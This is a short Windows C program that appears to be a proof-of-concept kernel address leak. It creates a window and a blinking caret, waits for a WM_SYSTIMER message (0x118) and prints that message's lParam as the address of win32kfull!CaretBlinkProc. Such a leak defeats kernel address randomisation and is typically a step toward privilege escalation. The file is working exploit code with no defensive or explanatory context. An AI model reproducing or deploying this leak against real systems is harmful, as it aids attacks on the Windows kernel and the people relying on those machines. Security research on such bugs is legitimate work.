
#include <stdio.h>
#include <conio.h>
#include <tchar.h>
#include <strsafe.h>
#include <windows.h>
#include <winternl.h>

typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;
#define MAX_LOG_MESSAGE 1024

BOOL LogMessage(LEVEL Level, LPCTSTR Format, ...)
{
	TCHAR Buffer[MAX_LOG_MESSAGE] = { 0 };
	va_list Args;

	va_start(Args, Format);
	StringCchVPrintf(Buffer, MAX_LOG_MESSAGE, Format, Args);
	va_end(Args);

	switch (Level) {
	case L_DEBUG: _ftprintf(stdout, TEXT("[?] %s\n"), Buffer); break;
	case L_INFO:  _ftprintf(stdout, TEXT("[+] %s\n"), Buffer); break;
	case L_WARN:  _ftprintf(stderr, TEXT("[*] %s\n"), Buffer); break;
	case L_ERROR: _ftprintf(stderr, TEXT("[!] %s\n"), Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}

HWND ExCreateWindow(DWORD dwCSStyle, LPCTSTR lpszWndName,
	DWORD dwWndStyleEx, DWORD dwStyle, LPRECT lprc) {
	HWND Hwnd = NULL;
	WNDCLASSEX wndClass = { 0 };
	wndClass.cbSize = sizeof(wndClass);
	wndClass.lpszClassName = lpszWndName;
	wndClass.style = dwCSStyle;
	wndClass.lpfnWndProc = DefWindowProc;
	wndClass.hInstance = GetModuleHandle(NULL);
	RegisterClassEx(&wndClass);
	Hwnd = CreateWindowEx(dwWndStyleEx, lpszWndName, lpszWndName,
		dwStyle, lprc->left, lprc->top, lprc->right-lprc->left, lprc->bottom-lprc->top, NULL, NULL, NULL, NULL);
	return Hwnd;
}

void main()
{
	RECT rc = { 0x253,0xa,0x524,0x28a };
	HWND hwnd = ExCreateWindow(0, TEXT("Fuck"), 0x80188, 0xc2ff0000, &rc);
	CreateCaret(hwnd, NULL, 5, 5);
	ShowCaret(hwnd);

	BOOL bRet;
	MSG msg;
	while ((bRet = GetMessage(&msg, hwnd, 0, 0)) != 0)
	{
		if (bRet == -1) {
			// handle the error and possibly exit
		} else {

			if (msg.message == 0x118) {
				LogMessage(L_INFO, TEXT("leak win32kfull!CaretBlinkProc 0x%p"), msg.lParam);
				break;
			}

			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	_getch();

}